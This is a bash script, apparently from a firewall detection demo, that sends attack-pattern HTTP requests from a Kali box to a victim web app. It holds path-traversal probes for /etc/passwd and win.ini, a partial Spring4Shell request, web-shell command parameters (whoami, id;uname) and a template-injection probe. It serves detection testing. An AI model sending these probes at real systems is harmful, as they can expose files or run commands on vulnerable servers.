#!/usr/bin/env bash
###############################################################################
# attack-web.sh <victim-ip-or-url>    (run on the KALI attacker box)
# The attacker actively exploits the victim's public-facing web app - inbound
# Kali -> victim traffic that the PAN NGFW inspects. Benign requests (dummy
# payloads); the point is the request PATTERN the firewall flags.
#
#   EAL / firewall: Possible path traversal (60da6e16),
#                   Spring4Shell (1028c23d), Suspicious HTTP parameters (3508f6b4)
#
# Needs a web listener on the victim so the sessions complete. The orchestrator
# starts a lightweight listener on the Windows victim before calling this.
###############################################################################
set -u
T="${1:?usage: attack-web.sh <victim-ip-or-http-url>}"
case "$T" in http*://*) BASE="$T";; *) BASE="http://$T";; esac
UA="Mozilla/5.0 (EAL-demo attacker)"
c(){ curl -s -m 8 -A "$UA" -o /dev/null -w "  %{http_code}  $1\n" "$BASE$1" 2>/dev/null || echo "  ---   $1 (no response)"; }

echo "[*] Attacking web app at $BASE"

echo "[1] Path traversal probes..."
c "/../../../../etc/passwd"
c "/..%2f..%2f..%2fwindows/win.ini"
c "/index.php?page=php://filter/convert.base64-encode/resource=index"

echo "[2] Spring4Shell (CVE-2022-22965) attempt..."
c "/tomcatwar.jsp?class.module.classLoader.resources.context.parent.pipeline.first.pattern=x"
curl -s -m 8 -A "$UA" -o /dev/null -w "  %{http_code}  POST /\n" \
  --data 'class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp' \
  -H 'suffix: .jsp' -H 'c1: Runtime' -H 'c2: <%' "$BASE/" 2>/dev/null || echo "  ---   POST /"

echo "[3] Web-shell / suspicious parameters..."
c "/shell.jsp?cmd=whoami"
c "/upload.php?action=exec&c=id;uname%20-a"
c "/search?q=%7B%7B7*7%7D%7D"

echo "[OK] Web attack complete against $BASE"
